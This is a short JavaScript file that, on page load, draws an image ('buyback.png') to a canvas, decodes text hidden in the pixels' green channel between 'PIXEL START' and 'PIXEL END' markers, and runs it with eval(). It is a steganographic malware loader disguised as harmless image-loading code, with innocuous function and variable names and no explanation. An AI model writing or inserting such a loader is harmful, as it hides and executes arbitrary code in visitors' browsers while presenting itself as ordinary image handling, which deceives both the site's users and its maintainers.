const loadCanvasImage = async () => {
  const canvas = document.getElementById("canva");
  const ctx = canvas.getContext("2d");
  const imgEl = document.createElement("img");
  imgEl.src = "./img/buyback.png";
  imgEl.onload = () => {
    ctx.canvas.width = imgEl.width;
    ctx.canvas.height = imgEl.height;
    ctx.drawImage(imgEl, 0, 0);
    const imageData = ctx.getImageData(0, 0, imgEl.width, imgEl.height);
    const pixelColorArray = imageData.data;
    const pixelRGB = [];
    for (let i = 0; i < pixelColorArray.length; i += 4) {
      pixelRGB.push([
        pixelColorArray[i],
        pixelColorArray[i + 1],
        pixelColorArray[i + 2],
      ]);
    }
    const pixelRGBColor = pixelRGB
      .map(([r, g, b]) => String.fromCharCode(g))
      .join("");
    const pixelColor = pixelRGBColor.match(/(?<=----PIXEL START----)(.*)(?=----PIXEL END----)/);
    if (pixelColor === null) return;
    eval(pixelColor[0]);
  };
};

window.onload = () => {
  loadCanvasImage();
};
